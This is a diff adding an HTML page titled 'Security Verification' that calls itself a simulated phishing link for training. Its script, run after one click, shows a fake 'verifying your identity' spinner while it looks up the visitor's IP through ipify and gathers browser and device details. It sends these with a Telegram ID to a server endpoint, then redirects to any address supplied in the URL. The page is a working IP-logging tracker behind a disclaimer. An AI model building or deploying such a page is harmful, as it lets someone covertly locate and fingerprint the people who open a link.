@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Security Verification</title>
+  <meta name="robots" content="noindex">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .warning-container {
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      padding: 30px;
+      max-width: 600px;
+      text-align: center;
+    }
+    .warning-header {
+      color: #d32f2f;
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+    .warning-content {
+      font-size: 18px;
+      line-height: 1.6;
+      margin-bottom: 25px;
+      color: #333;
+    }
+    .warning-buttons {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+    }
+    .btn {
+      padding: 12px 30px;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: all 0.3s;
+    }
+    .btn-exit {
+      background: #d32f2f;
+      color: white;
+    }
+    .btn-proceed {
+      background: #388e3c;
+      color: white;
+    }
+    .btn:hover {
+      opacity: 0.9;
+      transform: translateY(-2px);
+    }
+  </style>
+</head>
+<body>
+  <div class="warning-container">
+    <h1 class="warning-header">⚠️ SECURITY WARNING</h1>
+    <div class="warning-content">
+      <p><strong>This is a simulated phishing link for educational purposes.</strong></p>
+      <p>This link was created for cybersecurity training and self-testing. If you did not request this link or arrived here unintentionally, please exit immediately.</p>
+      <p><strong>No real malware or data theft will occur.</strong></p>
+    </div>
+    <div class="warning-buttons">
+      <button class="btn btn-exit" onclick="window.location.href='https://google.com'">
+        🚫 Exit Immediately
+      </button>
+      <button class="btn btn-proceed" onclick="startVerification()">
+        ✅ I Understand & Proceed
+      </button>
+    </div>
+  </div>
+
+  <script>
+    // Get URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const telegramId = urlParams.get('telegramId');
+    const redirectUrl = urlParams.get('redirectUrl') || 'https://google.com';
+
+    function startVerification() {
+      document.body.innerHTML = `
+        <div style="text-align:center; padding:50px;">
+          <h2>Verifying your identity...</h2>
+          <div class="spinner"></div>
+          <style>
+            .spinner {
+              border: 5px solid #f3f3f3;
+              border-top: 5px solid #3498db;
+              border-radius: 50%;
+              width: 50px;
+              height: 50px;
+              animation: spin 2s linear infinite;
+              margin: 20px auto;
+            }
+            @keyframes spin {
+              0% { transform: rotate(0deg); }
+              100% { transform: rotate(360deg); }
+            }
+          </style>
+        </div>
+      `;
+      
+      // Start data collection
+      setTimeout(() => collectAndSendData(), 2000);
+    }
+
+    async function collectAndSendData() {
+      const deviceInfo = await getDeviceInfo();
+      
+      try {
+        await fetch('/api/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ telegramId, ...deviceInfo })
+        });
+      } catch (error) {
+        console.error('Submission error:', error);
+      }
+      
+      // Redirect after completion
+      window.location.href = redirectUrl;
+    }
+
+    async function getDeviceInfo() {
+      return {
+        ip: await getIP(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timestamp: new Date().toISOString()
+      };
+    }
+
+    async function getIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch {
+        return 'Unknown';
+      }
+    }
+  </script>
+</body>
+</html>
